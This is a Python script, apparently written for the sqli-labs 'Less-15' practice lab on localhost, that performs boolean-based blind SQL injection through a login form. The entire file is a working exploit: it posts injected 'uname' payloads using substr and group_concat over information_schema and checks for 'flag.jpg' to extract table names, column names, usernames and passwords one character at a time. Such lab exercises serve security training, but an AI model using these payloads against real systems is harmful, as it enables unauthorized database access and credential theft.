import requests
import string
import urllib.parse
import time
alphabet = list(string.ascii_lowercase)
alphabet.append(',')
num=['1', '2','3', '4', '5', '6', '7', '8', '9']
alphabet.extend(num)
lst = list(range(1,100))
url='http://localhost:1234/Less-15/'
word=""
tables=""
columns=""
password=""
for i in lst:
    for j in alphabet: 
        uwe = {"uname":f"1' or (substr((select group_concat(table_name) from information_schema.tables where table_schema=database() limit 0,1),{i},1)) = '{j}' #", "passwd": "ok","submit":"Submit"}
        w = requests.post(url,data=uwe )
        print(w.url)
        if "flag.jpg" in w.text:
            tables=tables+j
            print(tables)



for i  in lst:
    for j in alphabet: 
        we = {"uname":f"1' or (substr((select group_concat(column_name) from information_schema.columns where table_name='emails' limit 0,1),{i},1)) ='{j}'#", "passwd": "ok","submit":"Submit" }
        s = requests.post(url,data=we )
        print(s.url)
        if "flag.jpg" in s.text:
            columns=columns+j
          
            
             


for i  in lst:
    for j in alphabet: 
        rl = f"http://localhost:1234/Less-15/"
        k={"uname":f"1' or (substr((select group_concat(username) from users limit 0,1),{i},1)) = '{j}' #","passwd":"ok","submit":"Submit"}
        r = requests.post(url, data=k )
        print(r.url)
        if "flag.jpg" in r.text:
            word+=j

print(word)
            
for i  in lst :
    for j in alphabet: 
        drl={"uname":f"1' or (substr((select group_concat(password) from users limit 0,1),{i},1)) = '{j}' #","passwd":"ok","submit":"Submit"}
        qa= requests.post(url, data=drl )
        print(qa.url)
        if "flag.jpg" in qa.text:
            password=password+j
     
            




            
            
print(tables)            
print(word)               
print(password)
print(columns)


